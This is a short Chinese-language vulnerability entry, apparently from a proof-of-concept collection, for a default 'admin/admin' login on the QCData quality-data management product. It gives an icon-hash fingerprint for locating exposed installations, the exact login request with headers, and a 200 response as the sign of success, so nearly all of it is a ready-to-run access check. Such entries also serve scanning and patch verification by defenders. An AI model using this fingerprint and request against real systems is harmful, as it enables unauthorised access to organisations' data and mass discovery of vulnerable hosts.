# QCData品质数据管理专家UserLogin存在弱口令漏洞

QCData ｜ 默认口令 ｜ —
- **指纹**：`icon_hash="2029937574"`
- **请求**：`GET /Account/UserLogin?user_name=admin&user_pwd=admin&_=1770619786975 HTTP/1.1`

**Payload**
```
admin/admin
Host:
Cookie: QCWeb_lang=zh-CN
X-Requested-With: XMLHttpRequest
Priority: u=0
```
- **响应特征**：200